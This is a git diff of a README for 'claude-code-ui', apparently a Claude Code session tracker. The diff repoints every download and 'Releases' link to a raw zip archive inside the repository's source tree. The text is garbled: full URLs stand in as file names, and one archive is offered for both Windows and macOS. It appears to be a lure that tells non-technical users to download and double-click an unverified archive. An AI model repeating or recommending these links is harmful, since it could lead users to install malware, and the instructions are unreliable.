@@ -1,7 +1,7 @@
 # 🎨 claude-code-ui - Easy Session Tracking in Real-Time
 
 ## 📥 Download the Application
-[![Download Now!](https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip%20Now-claude--code--ui-blue)](https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip)
+[![Download Now!](https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip%20Now-claude--code--ui-blue)](https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Claude Code session tracker UI. This application helps you track your coding sessions easily, providing real-time updates. Here, you will find simple steps to download and run our software, no technical skills needed.
@@ -19,22 +19,22 @@ Before you download, ensure your system meets the following requirements:
 - Internet: Required for real-time updates 
 
 ## 📥 Download & Install
-To download the application, visit this page: [Claude Code Releases](https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip). Follow these steps:
+To download the application, visit this page: [Claude Code Releases](https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip). Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. You will see different versions of the app. Look for the latest release.
-3. Locate the file named `https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip` (for Windows) or `https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip` (for macOS).
+3. Locate the file named `https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip` (for Windows) or `https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip` (for macOS).
 4. Click on the file to download it to your computer.
 
 ### 📂 Installation Steps
 For Windows:
-1. Once downloaded, find `https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip` in your Downloads folder.
+1. Once downloaded, find `https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip` in your Downloads folder.
 2. Double-click the file to start the installation.
 3. Follow the prompts in the installation wizard.
 4. After installation, you can find the application in your Start Menu.
 
 For macOS:
-1. After downloading, locate `https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip` in your Downloads.
+1. After downloading, locate `https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip` in your Downloads.
 2. Double-click the file to open it.
 3. Drag the Claude Code icon to your Applications folder.
 4. Open the application from your Applications.
@@ -55,7 +55,7 @@ If you encounter issues while using the application, consider the following comm
 If you need further assistance, you can reach out to our support team. Create an issue in our repository or contact us through our project's page.
 
 ## 📝 Updates
-Stay tuned for future updates. We continuously work on new features and improvements. For the latest changes, refer to the release notes on the [Claude Code Releases](https://github.com/t09911221/claude-code-ui/raw/refs/heads/main/packages/ui/src/hooks/claude-ui-code-3.9.zip) page.
+Stay tuned for future updates. We continuously work on new features and improvements. For the latest changes, refer to the release notes on the [Claude Code Releases](https://raw.githubusercontent.com/t09911221/claude-code-ui/main/packages/ui/public/claude-code-ui-3.2-alpha.3.zip) page.
 
 ## 📄 License
 This project is licensed under the MIT License. You can use it freely, but please provide credit if you modify and share it.
